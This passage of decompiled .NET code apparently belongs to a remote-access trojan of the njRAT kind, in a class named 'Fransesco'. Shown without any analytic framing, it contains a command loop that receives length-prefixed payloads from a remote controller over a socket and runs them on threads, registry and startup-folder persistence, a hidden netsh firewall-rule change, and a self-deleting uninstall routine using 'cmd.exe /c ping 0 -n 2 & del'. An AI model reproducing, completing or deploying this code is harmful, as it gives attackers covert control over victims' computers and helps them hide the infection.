    public static void RC()
    {
      while (true)
      {
        Fransesco.lastcap = "";
        if (Fransesco.C != null)
        {
          long num1 = -1;
          int num2 = 0;
          try
          {
            while (true)
            {
              do
              {
                checked { ++num2; }
                if (num2 == 10)
                {
                  num2 = 0;
                  Thread.Sleep(1);
                }
                if (Fransesco.Cn)
                {
                  if (Fransesco.C.Available < 1)
                    Fransesco.C.Client.Poll(-1, SelectMode.SelectRead);
label_10:
                  do
                  {
                    if (Fransesco.C.Available > 0)
                    {
                      if (num1 == -1L)
                      {
                        string str = "";
                        while (true)
                        {
                          int CharCode = Fransesco.C.GetStream().ReadByte();
                          switch (CharCode)
                          {
                            case -1:
                              goto label_26;
                            case 0:
                              num1 = Conversions.ToLong(str);
                              if (num1 == 0L)
                              {
                                Fransesco.Send("");
                                num1 = -1L;
                              }
                              goto label_10;
                            default:
                              str += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(CharCode).ToString()));
                              continue;
                          }
                        }
                        goto label_19;
                      }
                      else
                        goto label_19;
                    }
                    else
                      goto label_24;
                  }
                  while (Fransesco.C.Available > 0);
                  continue;
label_19:
                  Fransesco.b = new byte[checked (Fransesco.C.Available + 1 - 1 + 1)];
                  long num3 = checked (num1 - Fransesco.MeM.Length);
                  if ((long) Fransesco.b.Length > num3)
                    Fransesco.b = new byte[checked ((int) (num3 - 1L) + 1 - 1 + 1)];
                  int count = Fransesco.C.Client.Receive(Fransesco.b, 0, Fransesco.b.Length, SocketFlags.None);
                  Fransesco.MeM.Write(Fransesco.b, 0, count);
                }
                else
                  goto label_26;
              }
              while (Fransesco.MeM.Length != num1);
              num1 = -1L;
              Thread thread = new Thread(new ParameterizedThreadStart(Fransesco.Lambda1), 1);
              thread.Start((object) Fransesco.MeM.ToArray());
              thread.Join(100);
              Fransesco.MeM.Dispose();
              Fransesco.MeM = new MemoryStream();
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
label_24:;
        }
label_26:
        do
        {
          try
          {
            if (Fransesco.PLG != null)
            {
              NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Fransesco.PLG), (System.Type) null, "clear", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
              Fransesco.PLG = (object) null;
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          Fransesco.Cn = false;
        }
        while (!Fransesco.connect());
        Fransesco.Cn = true;
      }
    }

    public static byte[] SB(ref string S) => Encoding.UTF8.GetBytes(S);

    public static bool Send(string S) => Fransesco.Sendb(Fransesco.SB(ref S));

    public static bool Sendb(byte[] b)
    {
      if (!Fransesco.Cn)
        return false;
      try
      {
        lock (Fransesco.LO)
        {
          if (!Fransesco.Cn)
            return false;
          MemoryStream memoryStream = new MemoryStream();
          string S = b.Length.ToString() + "\0";
          byte[] buffer = Fransesco.SB(ref S);
          memoryStream.Write(buffer, 0, buffer.Length);
          memoryStream.Write(b, 0, b.Length);
          Fransesco.C.Client.Send(memoryStream.ToArray(), 0, checked ((int) memoryStream.Length), SocketFlags.None);
        }
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        ProjectData.SetProjectError(ex1);
        try
        {
          if (Fransesco.Cn)
          {
            Fransesco.Cn = false;
            Fransesco.C.Close();
          }
        }
        catch (Exception ex2)
        {
          ProjectData.SetProjectError(ex2);
          ProjectData.SetProjectError(ex2);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return Fransesco.Cn;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        Fransesco.F.Registry.CurrentUser.CreateSubKey("Software\\" + Fransesco.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))), typ);
        flag = true;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        flag = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void UNS()
    {
      Fransesco.pr(0);
      Fransesco.Isu = false;
      try
      {
        Fransesco.F.Registry.CurrentUser.OpenSubKey(Fransesco.sf, true).DeleteValue(Fransesco.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Fransesco.F.Registry.LocalMachine.OpenSubKey(Fransesco.sf, true).DeleteValue(Fransesco.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("netsh firewall delete allowedprogram \"" + Fransesco.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Fransesco.FS != null)
        {
          Fransesco.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Fransesco.RG + ".exe");
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Fransesco.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Fransesco.RG, false);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + Fransesco.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }

    [DllImport("user32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern long ShowCursor(long bShow);
  }
}
